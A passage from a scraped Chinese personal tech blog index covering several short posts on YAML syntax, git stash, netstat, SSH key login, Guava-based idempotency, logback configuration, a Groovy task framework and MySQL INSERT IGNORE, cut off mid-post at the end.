# 表示单行注释 破折号后面跟一个空格（a dash and space）表示列表 用冒号和空格表示键值对 key: value 简单数据（scalars，标量数据）可以不使用引号括起来，包括字符串数据 用单引号或者双引号括起来的被当作字符串数据，在单引号或双引号中使用C风格的转义字符 1. 数组写法一个简单的数组，用-来列出即可，如下 123- apple- orange- banana 2. 对象一个简单的kv对象 1234fruit: name: banana amount: 3 price: 4.99 加载后数据结构如下： 3. 对象数组首先大结构是数组，但是数组内部是一个kv结构的对象 123456789- name: apple price: 1.23- name: orange price: 1.33- name: banana price: 2.33 加载后数据结构如下： 4. 数组对象首先大结构是对象，对象内部的成员是数组 12345678name: - apple - orange - bananaprice: - 4.99 - 2.34 - 3.99 加载后数据结构如下: 5. 多维数组123- [apple, 3.88]- [orange, 3.99]- [banana, 2.99] 用中括号包括起来，形成一个二维数组，加载后的数据结构如下 6. 对象的扩展写法对于kv结构的对象，支持通过大括号的方式来替代，简化配置文件的行数 12love: {name: apple, price: 2.99}hite: {name: orange, price: 1.99} 上面的配置，等同于 123456love: name: apple price: 2.99hite: name: orange price: 1.99 II. YAML文件读写在Java生态环境中，读写YAML文件算是比较简单的一个事情了，一个是自己读取文件，然后按照语法进行解析（属于自己造轮子）；另外一个就是利用开源库来读写，这里当然是选择已经颇为完善的开源库来处理了 1. 依赖pom文件中添加maven依赖，版本号查询最新的即可 12345&lt;dependency&gt; &lt;groupId&gt;org.yaml&lt;/groupId&gt; &lt;artifactId&gt;snakeyaml&lt;/artifactId&gt; &lt;version&gt;1.17&lt;/version&gt;&lt;/dependency&gt; 2. 封装类123456789101112131415161718192021222324public class YamlUtil { public static InputStream loadStream(String path) throws IOException { if (path.startsWith(\"http\")) { URL url = new URL(path); return url.openStream(); } else if (path.startsWith(\"/\")) { return new FileInputStream(path); } else { return YamlUtil.class.getClassLoader().getResourceAsStream(path); } } public static &lt;T&gt; T loadConf(String path, Class&lt;T&gt; clz) throws IOException { try (InputStream inputStream = loadStream(path)) { Yaml yaml = new Yaml(); return yaml.loadAs(inputStream, clz); } } public static &lt;T&gt; void dumpConf(String save, T obj) throws IOException { Yaml yaml = new Yaml(); yaml.dump(obj, new BufferedWriter(new FileWriter(save))); }} 实现比较简单了，直接利用 Yaml对象的 loadAs/dump 方法即可，对于测试用例，前面的截图已经给出，不再赘述 III. 其他0. 小结核心语法: 使用空格 Space 缩进表示分层，不同层次之间的缩进可以使用不同的空格数目，但是同层元素一定左对齐，即前面空格数目相同（不要使用tab） # 表示单行注释 破折号后面跟一个空格表示列表 用冒号和空格表示键值对 key: value 简单数据可以不使用引号括起来，包括字符串数据 用单引号或者双引号括起来的被当作字符串数据，在单引号或双引号中使用C风格的转义字符 转义demo: 12comment: '#'skip: \"abc\\n123\" 对应测试用例及输出 12345678910111213@Testpublic void testYamlUtil() throws IOException { TC map = YamlUtil.loadConf(\"test.yml\", TC.class); System.out.println(map);}@Data@AllArgsConstructor@NoArgsConstructorpublic static class TC { private String comment; private String skip;} 输出结果 12YamlUtilTest.TC(comment=#, skip=abc123) 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/06/19/180619-Yaml文件语法及读写小结/"},{"title":"180608-Git工具之Stash","text":"git stash 暂存背景： 实际开发过程中，经常可能遇到的一个问题，当你在dev分支上正开发得happy的时候；突然来了个线上bug，得赶紧从release分支上切一个bugfix分支来解决线上问题，这个时候，正在开发的东西，就得暂存了 之前对于Git只是简单的了解了下，只处于入门的会用级别，遇到上面这个问题，采取的是一个比较笨的方案: 123456789101112131415161718192021# 1. 将当前改动保存，并提交一个tmp commitgit add .git commit -m 'tmp save'## 注意上面只是提交到本地，没有推送到远端仓库# 2. 开始bugfix## 然后切换到release 分支，并获取最新代码git checkout releasegit pull origin release## 新建bugfix分支git checkout -b bugfix... # 开始干活# 3. 回到原来分支，继续干活git checkout devgit loggit reset --soft commit号 虽然上面这样也可以曲线救国，但是在了解到Git stash之后，就简单多了，不需要commit和reset I. git stash 命令1. 基本命令将当前改动暂存，恢复到上一次commit号对应的状态 1git stash 上面执行完毕之后，当前所有的改动会被暂存，然后工作区变得干净，使用git status会发现没有修改 查看暂存的列表 1git stash list 如果需要恢复之前的改动，执行 1git stash pop 2. 实例演示下面是个人的一个项目的测试结果 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354✗ git statusOn branch masterYour branch is up-to-date with 'origin/master'.Changes not staged for commit: (use \"git add &lt;file&gt;...\" to update what will be committed) (use \"git checkout -- &lt;file&gt;...\" to discard changes in working directory) modified: spring-rabbit/src/test/java/com/git/hui/rabbit/spring/SprintUnit.java modified: spring-rabbit/src/test/java/com/git/hui/rabbit/spring/fac/FacMQConsumer.javano changes added to commit (use \"git add\" and/or \"git commit -a\")✗ git stash Saved working directory and index state WIP on master: 8a96c7b 添加基于配置的消费者方式HEAD is now at 8a96c7b 添加基于配置的消费者方式✗ git stash liststash@{0}: WIP on master: 8a96c7b 添加基于配置的消费者方式✗ git statusOn branch masterYour branch is up-to-date with 'origin/master'.nothing to commit, working tree clean✗ git stash popOn branch masterYour branch is up-to-date with 'origin/master'.Changes not staged for commit: (use \"git add &lt;file&gt;...\" to update what will be committed) (use \"git checkout -- &lt;file&gt;...\" to discard changes in working directory) modified: spring-rabbit/src/test/java/com/git/hui/rabbit/spring/SprintUnit.java modified: spring-rabbit/src/test/java/com/git/hui/rabbit/spring/fac/FacMQConsumer.javano changes added to commit (use \"git add\" and/or \"git commit -a\")Dropped refs/stash@{0} (fa73ca947d591003cd46a49f6d657cce43756d1a)✗ git stash list✗ git statusOn branch masterYour branch is up-to-date with 'origin/master'.Changes not staged for commit: (use \"git add &lt;file&gt;...\" to update what will be committed) (use \"git checkout -- &lt;file&gt;...\" to discard changes in working directory) modified: spring-rabbit/src/test/java/com/git/hui/rabbit/spring/SprintUnit.java modified: spring-rabbit/src/test/java/com/git/hui/rabbit/spring/fac/FacMQConsumer.javano changes added to commit (use \"git add\" and/or \"git commit -a\") 3. 进阶简单的使用场景下，需要暂存时，直接输入 git stash 命令即可；需要恢复执行 git stash pop; 如果出现多次的工作区暂存，会怎样？ 两次暂存之后: (最近暂存的，序号最小) 123✗ git stash liststash@{0}: WIP on master: 8a96c7b 添加基于配置的消费者方式stash@{1}: WIP on master: 8a96c7b 添加基于配置的消费者方式 应用某次暂存： 1git stash apply stash@{1} 执行apply只是会恢复当时暂存的内容，但是不会删除，如果需要删除指定stash，可以执行 1git stash drop stash@{1} 4. 取消储藏在某些情况下，你可能想应用储藏的修改，在进行了一些其他的修改后，又要取消之前所应用储藏的修改。Git没有提供类似于 stash unapply 的命令，但是可以通过取消该储藏的补丁达到同样的效果： 1git stash show -p stash@{0} | git apply -R II. 其他1. 参考 Git 工具 - 储藏（Stashing） 2. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 3. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 4. 扫描关注","link":"/hexblog/2018/06/08/180608-Git工具之Stash/"},{"title":"180628-动态任务执行框架想法篇","text":"数据订正带来的动态任务执行框架的想法I. 背景对于后端而言，数据订正可算是非常非常频繁且常见的事情了，常见的有DB、缓存、内存等数据源中的数据订正，对于非应用内存而言，其他有实体或者可以直接通过官方的提供的控制台连接进行修改的数据订正，相对比较简单，而对于应用内存，如果没有应用内通知并处理相关逻辑，多半就只能重启应用来实现刷新内存缓存了 当然我这里说的也不是内存数据更新，最近遇到的一个问题就是redis缓存中的数据有问题，需要订正，而并不是简单的把数据删了就行，需要根据某些数据，做一些计算，然后得出新的数据，并写回到缓存 这样看来好像也不太麻烦，如果没有第三方依赖，大不了写个python脚本或者php脚本，重新算一下，也没什么毛病 然而实际情况却并不是这样，问题有以下几点： 数据经过ProtoBuf进行编码存入redis，反序列化是个问题 数据计算有依赖外部服务，如只能通过rpc调用第三方接口，而rpc框架没有提供php或python的sdk 基于此，就想也米有办法，可以直接搞一个项目，可以执行Groovy脚本，在Groovy脚本中实现数据订正逻辑？需求如下 支持Groovy脚本的动态更新（支持动态新增，删除和修改脚本） Groovy脚本可友好的访问我们需要的外部资源 II. 设计根据上面的想法，一个简单的设计思路就新鲜出炉了，我们的框架核心只需要支持两点即可： 实时加载脚本 运行脚本 当然为了扩展，以及提供更优雅的使用环境，则需要支持： 丰富的插件支持 json序列化插件 http插件 rpc插件 redis缓存插件 自定义各种插件 插件可动态加载就更棒了 避免蛋疼的jar包冲突 1. 项目结构项目结构图大致如下 2. 流程说明a. Task Watcher主要用来监听所有的Task变动，包括新增，删除or修改脚本，然后将最新的脚本捞出来，扔给框架 b. execute主体的执行逻辑，主要是解析task（即groovy脚本），并根据task的变更事件，来决定是新增，删除还是更新任务，然后从任务池中停掉旧的任务，执行新的任务 c. plugin这里提供丰富的第三方插件，供task调用 2. 实现借助这个想法，创建了一个开源的任务执行框架 QuickTask 下面从设计之初，详细介绍了这个项目的诞生过程及相关细节 2018/07/02 180702-QuickTask动态脚本支持框架整体介绍篇 2018/07/19 180719-Quick-Task 动态脚本支持框架之使用介绍篇 2018/07/23 180723-Quick-Task 动态脚本支持框架之结构设计篇 2018/07/29 180729-Quick-Task 动态脚本支持框架之任务动态加载 2018/08/07 180807-Quick-Task 动态脚本支持框架之Groovy脚本加载执行 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 源码：https://github.com/liuyueyi/quick-task 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/06/28/180628-动态任务执行框架想法篇/"},{"title":"180703-netstat常用命令学习小结","text":"平常工作中，经常会出现的一个case就是查询端口号占用情况，一般在linux下使用netstat，在mac下则使用lsof；本篇则记录下Linux之netstat命令的使用 最常用的一个查看端口号占用命令： 1netstat -alnp | grep port I. netstat 用法1. 参数说明主要是查看对应的参数相关 123456789101112131415161718192021222324-a或--all：显示所有连线中的Socket；-A&lt;网络类型&gt;或--&lt;网络类型&gt;：列出该网络类型连线中的相关地址；-c或--continuous：持续列出网络状态；-C或--cache：显示路由器配置的快取信息；-e或--extend：显示网络其他相关信息；-F或--fib：显示FIB；-g或--groups：显示多重广播功能群组组员名单；-h或--help：在线帮助；-i或--interfaces：显示网络界面信息表单；-l或--listening：显示监控中的服务器的Socket；-M或--masquerade：显示伪装的网络连线；-n或--numeric：直接使用ip地址，而不通过域名服务器；-N或--netlink或--symbolic：显示网络硬件外围设备的符号连接名称；-o或--timers：显示计时器；-p或--programs：显示正在使用Socket的程序识别码和程序名称；-r或--route：显示Routing Table；-s或--statistice：显示网络工作信息统计表；-t或--tcp：显示TCP传输协议的连线状况；-u或--udp：显示UDP传输协议的连线状况；-v或--verbose：显示指令执行过程；-V或--version：显示版本信息；-w或--raw：显示RAW传输协议的连线状况；-x或--unix：此参数的效果和指定&quot;-A unix&quot;参数相同；--ip或--inet：此参数的效果和指定&quot;-A inet&quot;参数相同。 2. 常用的几个组合列出所有端口（包括监听和未监听） 123netstat -anetstat -at # 显示所有tcp端口netstat -au # 显示所有udp端口 列出所有处于监听状态的 Sockets 1234netstat -l #只显示监听端口netstat -lt #只列出所有监听 tcp 端口netstat -lu #只列出所有监听 udp 端口netstat -lx #只列出所有监听 UNIX 端口 显示pid和进程 1netstat -pt II. 其他0. 参考 netstat命令 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/07/03/180703-netstat常用命令学习小结/"},{"title":"180625-关于时间窗口的想法","text":"关于滑动时间窗口的想法如何设计一个维护当前时间，当之前3min, 5min, 10min, 1h, 24h时间窗口内的访问计数的数据结构，简单来讲就是如何优雅的设计一个滑动时间窗口 I. 基本结构1. 数据结构设计的数据结构如下: 在redis中维护1440的数组，其中以当前的时间戳相对于当天0点的分钟数，作为该时间戳对应数组的坐标 1234public static int getMinuteByDay(long time) { LocalDateTime localDateTime = getDateTimeOfTimestamp(time, TimeConstant.GMT_ZONE); return localDateTime.getMinute() + localDateTime.getHour() * 60;} 实时新增数据，维护两个结构 1440数组中的数组块内容实时更新 时间窗口内的总资金新增 释放过期数据，每分钟执行一次 时间窗口内的总资金 - 过期的数据 2. 问题及注意点 新增数据和释放过期数据时，并发安全问题 如何保证能正确及时的删除过期数据，且不会出现重复减的问题 II. 其他0. 几点想法简单的想了一个维护时间窗口的想法，也没有深入下去实现，先记录下来，留待后续补齐 关于时间窗口，简单说几点： 实时更新，往往不太现实，特别是数据量特别大的情况下，每s更新一次，都会导致大量的数据计算；因此需要折中方案 关于删除过期的数据，这一块往往是重难点，如何及时删除，并发问题怎么避免，如果用锁，竞争也得考虑？重复删除怎么办？应用挂掉or重启之后，如何保证时间窗口的数据准确性？… 关于时间窗口在生产环境中的应用，并没有想象中的那么简单，虽然目前也没有查到相关的开源库可以直接使用，，但是这一块的实现也挺有意思的，可以好好想一想，研究一二 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/06/25/180625-关于时间窗口的想法/"},{"title":"180702-QuickTask动态脚本支持框架整体介绍篇","text":"Quick-Task 动态脚本支持框架整体介绍篇一个简单的动态脚本调度框架，支持运行时，实时增加,删除和修改动态脚本，可用于后端的进行接口验证、数据订正，执行定时任务或校验脚本 本项目主要涉及到的技术栈: groovyEngine （groovy脚本加载执行） commons-io （文件变动监听） I. 使用姿势1. pom配置添加仓库地址 123456&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;yihui-maven-repo&lt;/id&gt; &lt;url&gt;https://raw.githubusercontent.com/liuyueyi/maven-repository/master/repository&lt;/url&gt; &lt;/repository&gt;&lt;/repositories&gt; 添加项目依赖 12345&lt;dependency&gt; &lt;groupId&gt;com.git.hui&lt;/groupId&gt; &lt;artifactId&gt;task-core&lt;/artifactId&gt; &lt;version&gt;0.0.1&lt;/version&gt;&lt;/dependency&gt; 2. 使用demoa. 源码方式源码下载之后的使用case，可以参考 com.git.hui.task.AppLaunch，运行main方法，监听./task-core/src/test/java/com/git/hui/task目录下脚本的变动即可 b. jar包引用首先准备一个Groovy脚本，放在指定的目录下，如 /tmp/script/DemoScript.groovy 123456789101112131415package com.git.hui.taskimport com.git.hui.task.api.ITaskclass DemoScript implements ITask { @Override void run() { println name() + \" | now &gt; : &gt;&gt;\" + System.currentTimeMillis() } @Override void interrupt() { println \"over\" }} 对应的启动类可以如下 123456789101112131415public class AppRunner { // main 方式 public static void main(String[] args) throws Exception { new ScriptExecuteEngine().run(\"/tmp/script/\"); Thread.sleep(24 *60 * 60 * 1000); } // junit 方式启动 @Test public void testTaskRun() { new ScriptExecuteEngine().run(\"/tmp/script/\"); Thread.sleep(24 *60 * 60 * 1000); }} c. 测试应用启动完毕之后 可以修改 /tmp/script/DemoScript.groovy 脚本的内容，保存后查看是否关闭旧的脚本并执行更新后的脚本 测试在 /tmp/script 目录下新增脚本 测试删除 /tmp/script 目录下的脚本 测试异常的case (如非法的groovy文件，内部运行异常等…) 注意 不要在groovy脚本中执行 System.exit(1), 会导致整个项目都停止运行 II. 设计原理基本结构如下图 从图中基本上也可以看出，这个项目的结构属于非常轻量级的，核心角色，有下面几个 Task ： 具体的任务脚本 TaskContainer： 持有执行任务的容器 TaskChangeWatcher： 任务观察器，用于查看是否有新增、删除or修改任务，从而卸载旧的任务，并加载新的任务 另外一块属于扩展方面的插件体系，目前并没有给与实现，若将本框架继承在Spring生态体系中运行时，这些插件的支持就特别简单了 RedisTemplate RestTemplate AmqpTemplate xxxTemplate III. 其他0. 相关博文： 180628-动态任务执行框架想法篇 项目： https://github.com/liuyueyi/quick-task 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/07/02/180702-QuickTask动态脚本支持框架整体介绍篇/"},{"title":"180707-ssh远程免密登录配置","text":"通过ssh免密方式登录远程服务器, 配置比较简单，就是讲自己的rsa公钥放在远端服务器的授权文件中 1vim ~/.ssh/authorized_keys I. ssh配置首先检验是否已经生成相应的ssh文件 1ls -l ~/.ssh 主要需要判断目录下是否有 xxx_rsa, xxx_rsa.pub 如果没有则需要先生成公私钥 1ssh-keygen -t rsa -C \"your_email@example.com\" 然后将生成的xxx.pub文件中的内容，拷贝到目标服务器的 ~/.ssh/authoorized_keys文件中即可 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/07/07/180707-ssh远程免密登录配置/"},{"title":"180705-一个简单的幂等工具类实现","text":"一个简单的幂等工具类在日常的工作中，业务的去重幂等场景属于比较常见的需求，一般来讲简单的幂等工具类可以基于内存或者基于redis进行，本篇简单介绍下，如何使用Guava的缓存来实现一个幂等工具类 I. 基本思路与实现利用Guava的内存缓存来缓存，如果执行完毕，则在缓存中添加一个标识，每次执行之前，判断是否执行过，从而实现简单的幂等逻辑 1. 基本实现基于此，一个简单的工具来就出炉了 12345678910111213public static final String NOT_HIT_TAG = \"UNHIT_TAG\";private static LoadingCache&lt;String, Object&gt; idempotentCache = CacheBuilder.newBuilder().expireAfterAccess(3, TimeUnit.MINUTES).build(new CacheLoader&lt;String, Object&gt;() { @Override public Object load(String key) throws Exception { return NOT_HIT_TAG; }});public static Object getObject(String uuid) { return idempotentCache.getUnchecked(uuid);} 上面的代码比较简单，这个幂等工具类，key为唯一标识，value为上次计算的结果，因此在下次再次执行时，直接拿这个结果即可，适用于需要获取计算结果作为他用的业务场景中。那么在实际使用中，直接这么用是否可行？ 答案却是不行，在实际使用的时候，有几个地方需要注意 如果某次计算结果返回的null怎么办？ 内存是否会爆掉？ 2. null值问题针对返回结果为null的场景，也好解决，就是利用一个符号来代替null，简单的变形如下 12345678910111213141516171819202122232425262728public static final String NOT_HIT_TAG = \"UNHIT_TAG\";public static final String NULL_TAG = \"NULL_TAG\";private static LoadingCache&lt;String, Object&gt; idempotentCache = CacheBuilder.newBuilder().expireAfterAccess(3, TimeUnit.MINUTES).build(new CacheLoader&lt;String, Object&gt;() { @Override public Object load(String key) throws Exception { return NOT_HIT_TAG; } });public static Object getObject(String uuid) { Object obj = idempotentCache.getUnchecked(uuid); if (obj instanceof String) { if (NULL_TAG.equals(obj)) { return null; } } return obj;}public static void putObject(String uuid, Object val) { if (val == null) { val = NULL_TAG; } idempotentCache.put(uuid, val);} 在上面使用中，有一点需要注意，在取出数据之后，首先判断下是否为未命中状态？为什么未命中要这么干？而言看博文 180613-GuavaCache返回Null的注意事项 3. 内存问题虽然上面设置了失效时间为3min,但在jdk8的场景下，很容易发现内存疯狂上涨，不见到有回收？ why？这块可能与gauva的内存回收机制有关系，因为jdk8取消了永久代，使用了元空间，当没有设最大值时，会一直上涨，使用系统的内存 简单的解决方案就是主动回收掉无效的数据 1234567891011121314151617181920212223242526272829303132333435363738public static final String NOT_HIT_TAG = \"UNHIT_TAG\";public static final String NULL_TAG = \"NULL_TAG\";private static LoadingCache&lt;String, Object&gt; idempotentCache = CacheBuilder.newBuilder().expireAfterAccess(3, TimeUnit.MINUTES).build(new CacheLoader&lt;String, Object&gt;() { @Override public Object load(String key) throws Exception { return NOT_HIT_TAG; } });public static Object getObject(String uuid) { Object obj = idempotentCache.getUnchecked(uuid); if (obj instanceof String) { if (NULL_TAG.equals(obj)) { return null; } } return obj;}public static void putObject(String uuid, Object val) { if (val == null) { val = NULL_TAG; } idempotentCache.put(uuid, val);}public static void remove(String uuid) { idempotentCache.invalidate(uuid);}public static void registerScheduleClearTask() { ScheduledExecutorService task = Executors.newSingleThreadScheduledExecutor(new DefaultThreadFactory(\"idempotent\")); task.scheduleAtFixedRate(() -&gt; idempotentCache.cleanUp(), 1, 1, TimeUnit.MINUTES);} II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/07/05/180705-一个简单的幂等工具类实现/"},{"title":"180623-SpringBoot之logback配置文件","text":"SpringBoot配置logback项目的日志配置属于比较常见的case了，之前接触和使用的都是Spring结合xml的方式，引入几个依赖，然后写个 logback.xml 配置文件即可，那么在SpringBoot中可以怎么做？ I. 配置说明在resource目录下，新建一个日志文件: logback-spring.xml，内容如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;configuration&gt; &lt;!-- %m输出的信息,%p日志级别,%t线程名,%d日期,%c类的全名,%i索引【从数字0开始递增】,,, --&gt; &lt;!-- appender是configuration的子节点，是负责写日志的组件。 --&gt; &lt;!-- ConsoleAppender：把日志输出到控制台 --&gt; &lt;appender name=\"STDOUT\" class=\"ch.qos.logback.core.ConsoleAppender\"&gt; &lt;encoder&gt; &lt;pattern&gt;%d [%t] %-5level %logger{36}.%M\\(%file:%line\\) - %msg%n&lt;/pattern&gt; &lt;!-- 控制台也要使用UTF-8，不要使用GBK，否则会中文乱码 --&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;appender name=\"errorAlarm\" class=\"com.git.hui.story.common.alarm.ServiceAlarm\"&gt; &lt;!--如果只是想要 Error 级别的日志，那么需要过滤一下，默认是 info 级别的，ThresholdFilter--&gt; &lt;filter class=\"ch.qos.logback.classic.filter.ThresholdFilter\"&gt; &lt;level&gt;ERROR&lt;/level&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;!-- RollingFileAppender：滚动记录文件，先将日志记录到指定文件，当符合某个条件时，将日志记录到其他文件 --&gt; &lt;!-- 以下的大概意思是：1.先按日期存日志，日期变了，将前一天的日志文件名重命名为XXX%日期%索引，新的日志仍然是demo.log --&gt; &lt;!-- 2.如果日期没有发生变化，但是当前日志的文件大小超过1KB时，对当前日志进行分割 重命名--&gt; &lt;appender name=\"story\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\"&gt; &lt;!--如果只是想要 Error 级别的日志，那么需要过滤一下，默认是 info 级别的，ThresholdFilter--&gt; &lt;filter class=\"ch.qos.logback.classic.filter.ThresholdFilter\"&gt; &lt;level&gt;INFO&lt;/level&gt; &lt;/filter&gt; &lt;File&gt;logs/story.log&lt;/File&gt; &lt;!-- rollingPolicy:当发生滚动时，决定 RollingFileAppender 的行为，涉及文件移动和重命名。 --&gt; &lt;!-- TimeBasedRollingPolicy： 最常用的滚动策略，它根据时间来制定滚动策略，既负责滚动也负责出发滚动 --&gt; &lt;rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\"&gt; &lt;!-- 活动文件的名字会根据fileNamePattern的值，每隔一段时间改变一次 --&gt; &lt;!-- 文件名：log/demo.2018-06-23.0.log --&gt; &lt;fileNamePattern&gt;logs/arch/story.%d.%i.log&lt;/fileNamePattern&gt; &lt;!-- 每产生一个日志文件，该日志文件的保存期限为3天 --&gt; &lt;maxHistory&gt;3&lt;/maxHistory&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class=\"ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP\"&gt; &lt;!-- maxFileSize:这是活动文件的大小，默认值是10MB，测试时可改成1KB看效果 --&gt; &lt;maxFileSize&gt;10MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;/rollingPolicy&gt; &lt;encoder&gt; &lt;!-- pattern节点，用来设置日志的输入格式 --&gt; &lt;pattern&gt; %d %p (%file:%line\\)- %m%n &lt;/pattern&gt; &lt;!-- 记录日志的编码:此处设置字符集 - --&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!-- 指定项目中某个包，当有日志操作行为时的日志记录级别 --&gt; &lt;!-- 级别依次为【从高到低】：FATAL &gt; ERROR &gt; WARN &gt; INFO &gt; DEBUG &gt; TRACE --&gt; &lt;!-- additivity=false 表示匹配之后，不再继续传递给其他的logger--&gt; &lt;logger name=\"com.git.hui\" level=\"DEBUG\" additivity=\"false\"&gt; &lt;appender-ref ref=\"STDOUT\"/&gt; &lt;appender-ref ref=\"story\"/&gt; &lt;appender-ref ref=\"errorAlarm\"/&gt; &lt;/logger&gt; &lt;logger name=\"com.github.hui\" level=\"DEBUG\" additivity=\"false\"&gt; &lt;appender-ref ref=\"STDOUT\"/&gt; &lt;appender-ref ref=\"story\"/&gt; &lt;appender-ref ref=\"errorAlarm\"/&gt; &lt;/logger&gt; &lt;!-- 控制台输出日志级别 --&gt; &lt;root level=\"INFO\"&gt; &lt;appender-ref ref=\"STDOUT\"/&gt; &lt;/root&gt;&lt;/configuration&gt; 上面是一个基础的日志输出配置，额外说明几点： 配置文件名能否是其他的 在appender标签中对日志级别进行过滤 一个logger标签下有多个appender-ref 自定义的appender实现类 II. 扩展1. 配置文件名配置文件名默认为 logback-spring.xml，如果我希望改成 mylog.xml 可以怎么办？ 主要是修改 application.yml 配置文件中的参数指定 12logging: config: classpath:mylog.xml 2. logger标签logger标签下可以接上多个&lt;appender-ref&gt;, 即表示命中的日志，会采用这多个appender,都打印一遍，比如上面的，来一条日志，在控制台会输出，在日志文件会输出，如果是error日志，还会触发ServiceAlarm的逻辑 因此就有一个问题，我们可能希望不同的内部有个日志级别的控制，比如控制台可以输出debug日志，而日志文件中只输出info级别的，这就需要在appender标签内添加filter属性了 123456&lt;appender name=&quot;errorLog&quot; class=&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt; &lt;!--如果只是想要 Error 级别的日志，那么需要过滤一下，默认是 info 级别的，ThresholdFilter--&gt; &lt;filter class=&quot;ch.qos.logback.classic.filter.ThresholdFilter&quot;&gt; &lt;level&gt;WARN&lt;/level&gt; &lt;/filter&gt;&lt;/appender&gt; 3. 自定义appender实现类前面的配置文件中，使用了一个自定义的 AlarmService, 主要是在接收到错误日志时，实现自定义报警,对应的简单实现如下 123456789101112131415161718192021222324252627282930313233/** * 报警 * Created by @author yihui in 16:43 18/6/23. */public class ServiceAlarm extends AppenderBase&lt;ILoggingEvent&gt; { private static final long INTERVAL = 10 * 1000 * 60; private long lastAlarmTime = 0; @Override protected void append(ILoggingEvent iLoggingEvent) { if (canAlarm()) { doAlarm(iLoggingEvent.getFormattedMessage()); } } private boolean canAlarm() { long now = System.currentTimeMillis(); if (now - lastAlarmTime &gt;= INTERVAL) { lastAlarmTime = now; return true; } else { return false; } } private void doAlarm(String content) { try { EmailWrapper.sendMail(\"异常报警\", \"bangzewu@126.com\", content); } catch (Exception e) { e.printStackTrace(); } }} 4. 其他关于logback的配置文件中的详细参数，可以参考博文: Logback 简明使用手册 III. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/06/23/180623-SpringBoot之logback配置文件/"},{"title":"180710-MySql插入唯一键冲突的三种可选方式","text":"MySql插入时唯一键冲突的几种处理方式MySql插入一条记录，结果提示主键冲突，怎么办？ 批量插入数据时，发现插入的这批数据中，有某些记录存在唯一键冲突，一个一个跳出来就比较麻烦了，有什么好的办法直接忽略掉冲突的记录么？ 下面简单记录三种处理方式 I. 插入时唯一键冲突问题1. Ignore关键词某些场景下，我们需要批量插入的数据，某些已经在DB中了，因此我希望在出现冲突时，直接跳过，把能插入的都插入就好，这种情况下，使用ignore关键词就比较合适了 一个实际的case如下 1insert ignore into table (xxx, xxx) values (xxx,xxx), (xxx, xxx); 执行截图如下, 注意下面红框中的内容，表示忽略了两条，执行插入成功一条 2. Replace 